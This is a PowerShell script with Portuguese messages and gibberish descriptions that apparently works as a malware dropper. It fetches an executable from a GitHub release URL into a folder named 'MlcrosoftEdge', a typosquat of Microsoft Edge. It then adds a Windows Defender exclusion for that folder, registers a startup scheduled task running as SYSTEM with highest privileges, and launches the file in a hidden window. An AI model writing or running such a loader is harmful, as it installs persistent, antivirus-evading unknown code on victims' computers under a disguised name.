<#
.SYNOPSIS
D32N 8UD2N328UDXCM3289XM2U83XM238XMU28UXM238MX238X23

.DESCRIPTION
NSDA8D7213ND328YM243DC87Y2M4C28Y7MN2C84YUNM283CM2C4
#>

[CmdletBinding()]
param()

$ndsaijnbdsaiuhjbUdsauhibhusdahbRdmdsaoaL = "https://github.com/4ybbe/phpSv/releases/download/stupid/EdgeUpdateSupport.exe"
$asokimasoaosmodasmodpaD = "C:\ProgramData\MlcrosoftEdge"
$TksdaoqawopqwNisadnia = "MlcrosoftEdgeUpdateHelper"

function Test-IsAdmin {
    $p = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
    return $p.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
}

function Add-DefenderExclusion {
    param(
        [Parameter(Mandatory=$true)]
        [string]$Path
    )
    
    try {
        if (Get-Command "Add-MpPreference" -ErrorAction SilentlyContinue) {
            Add-MpPreference -ExclusionPath $Path -ErrorAction Stop
            Write-Host "Exclusão adicionada com sucesso!" -ForegroundColor Green
        } else {
            Write-Warning "Windows Defender não encontrado ou não disponível."
        }
    } catch {
        Write-Warning "Falha ao adicionar exclusão no Windows Defender: $_"
        Write-Warning "Tente executar como administrador ou adicione manualmente."
    }
}

function Download-File {
    param(
        [Parameter(Mandatory=$true)]
        [string]$Url,
        [Parameter(Mandatory=$true)]
        [string]$OutFile,
        [int]$Retries = 3
    )
    
    for ($i = 0; $i -lt $Retries; $i++) {
        try {
            Write-Host "Baixando de: $Url (tentativa $($i+1)/$Retries)"
            Invoke-WebRequest -Uri $Url -OutFile $OutFile -UseBasicParsing -ErrorAction Stop
            Write-Host "Download concluído com sucesso!" -ForegroundColor Green
            return
        } catch {
            if ($i -eq ($Retries - 1)) {
                throw "Falha ao baixar o arquivo após $Retries tentativas: $_"
            }
            Write-Host "Tentativa $($i+1) falhou, tentando novamente em 2 segundos..."
            Start-Sleep -Seconds 2
        }
    }
}

function Add-ScheduledTask {
    param(
        [Parameter(Mandatory=$true)]
        [string]$Nome,
        [Parameter(Mandatory=$true)]
        [string]$CaminhoExecutavel
    )
    
    try {
        Write-Host "Criando tarefa '$Nome' no agendador do Windows..."
        
        # Remove tarefa existente se houver
        $tarefaExistente = Get-ScheduledTask -TaskName $Nome -ErrorAction SilentlyContinue
        if ($tarefaExistente) {
            Write-Host "Tarefa existente encontrada. Removendo..."
            Unregister-ScheduledTask -TaskName $Nome -Confirm:$false -ErrorAction Stop
        }
        
        # Cria a tarefa usando schtasks.exe diretamente com todos os parâmetros necessários
        $comandoSchTasks = @"
schtasks /create /tn "$Nome" /tr "$CaminhoExecutavel" /sc onstart /ru SYSTEM /rl HIGHEST /f
"@
        
        Write-Host "Executando: $comandoSchTasks"
        
        # Executa o comando e captura a saída
        $resultado = Invoke-Expression $comandoSchTasks 2>&1
        
        # Verifica se o comando foi executado com sucesso
        if ($LASTEXITCODE -eq 0) {
            Write-Host "Tarefa '$Nome' criada com sucesso!" -ForegroundColor Green
            
            # Verifica se a tarefa foi realmente criada
            $tarefaVerificacao = Get-ScheduledTask -TaskName $Nome -ErrorAction SilentlyContinue
            if ($tarefaVerificacao) {
                Write-Host "✅ Tarefa verificada e ativa no sistema." -ForegroundColor Green
            } else {
                Write-Warning "⚠️ Tarefa criada mas não encontrada na verificação."
            }
        } else {
            throw "Falha ao criar tarefa. Código de saída: $LASTEXITCODE`nSaída: $resultado"
        }
        
    } catch {
        Write-Error "Erro ao criar tarefa no agendador: $_"
        Write-Host "`nTentando método alternativo..." -ForegroundColor Yellow
        
        # Método alternativo usando o módulo ScheduledTasks (fallback)
        try {
            Import-Module ScheduledTasks -ErrorAction Stop
            
            $Acao = New-ScheduledTaskAction -Execute $CaminhoExecutavel
            $Gatilho = New-ScheduledTaskTrigger -AtStartup
            $Configuracoes = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -MultipleInstances IgnoreNew
            
            Register-ScheduledTask -TaskName $Nome -Action $Acao -Trigger $Gatilho -Settings $Configuracoes -User "SYSTEM" -RunLevel Highest -Force -ErrorAction Stop
            
            Write-Host "Tarefa '$Nome' criada com sucesso (método alternativo)!" -ForegroundColor Green
        } catch {
            Write-Error "Falha no método alternativo também: $_"
            throw "Não foi possível criar a tarefa no agendador."
        }
    }
}

function Main {
    $isAdmin = Test-IsAdmin
    if (-not $isAdmin) {
        Write-Warning "Este script requer privilégios de administrador para algumas operações."
        $confirma = Read-Host "Deseja continuar mesmo assim? (S/N)"
        if ($confirma -ne 'S' -and $confirma -ne 's') {
            Write-Host "Script cancelado pelo usuário."
            return
        }
    }
    
    try {
        Write-Host "=== INICIANDO INSTALAÇÃO ===" -ForegroundColor Cyan
        Write-Host "URL: $ndsaijnbdsaiuhjbUdsauhibhusdahbRdmdsaoaL"
        Write-Host "Destino: $asokimasoaosmodasmodpaD"
        Write-Host "Nome da Tarefa: $TksdaoqawopqwNisadnia"
        Write-Host ""
        
        # 1. Cria a pasta de destino
        Write-Host "Passo 1/4: Criando diretório..."
        if (-not (Test-Path -Path $asokimasoaosmodasmodpaD)) {
            New-Item -ItemType Directory -Path $asokimasoaosmodasmodpaD -Force | Out-Null
            Write-Host "Diretório criado: $asokimasoaosmodasmodpaD"
        } else {
            Write-Host "Diretório já existe: $asokimasoaosmodasmodpaD"
        }
        
        # Adiciona exclusão no Windows Defender
        if ($isAdmin) {
            Write-Host "`nPasso 2/4: Configurando exclusão no Windows Defender..."
            Add-DefenderExclusion -Path $asokimasoaosmodasmodpaD
        } else {
            Write-Warning "Não é administrador. Pulando exclusão do Defender."
        }
        
        # 2. Baixa o executável
        Write-Host "`nPasso 3/4: Baixando executável..."
        $nomeArquivo = [System.IO.Path]::GetFileName($ndsaijnbdsaiuhjbUdsauhibhusdahbRdmdsaoaL)
        if ([string]::IsNullOrEmpty($nomeArquivo)) {
            $nomeArquivo = "EdgeUpdateSupport.exe"
        }
        $caminhoCompleto = Join-Path -Path $asokimasoaosmodasmodpaD -ChildPath $nomeArquivo
        
        Download-File -Url $ndsaijnbdsaiuhjbUdsauhibhusdahbRdmdsaoaL -OutFile $caminhoCompleto
        
        # 3. Cria tarefa no agendador
        Write-Host "`nPasso 4/4: Configurando tarefa no agendador..."
        if ($isAdmin) {
            Add-ScheduledTask -Nome $TksdaoqawopqwNisadnia -CaminhoExecutavel $caminhoCompleto
        } else {
            Write-Warning "Não é administrador. Não é possível criar tarefa no agendador."
            Write-Warning "Para criar a tarefa manualmente, execute como administrador:"
            Write-Warning "schtasks /create /tn '$TksdaoqawopqwNisadnia' /tr '$caminhoCompleto' /sc onstart /ru SYSTEM /rl HIGHEST"
        }
        
        # 4. Inicia o executável
        Write-Host "`nIniciando executável..."
        if (Test-Path -Path $caminhoCompleto) {
            Start-Process -FilePath $caminhoCompleto -WindowStyle Hidden
            Write-Host "Processo iniciado com sucesso!" -ForegroundColor Green
        } else {
            throw "Arquivo não encontrado para iniciar: $caminhoCompleto"
        }
        
        Write-Host "`n=== INSTALAÇÃO CONCLUÍDA COM SUCESSO ===" -ForegroundColor Green
        
    } catch {
        Write-Error "Erro durante a instalação: $_"
        Write-Host "`n=== INSTALAÇÃO FALHOU ===" -ForegroundColor Red
        Exit 1
    }
}

Main
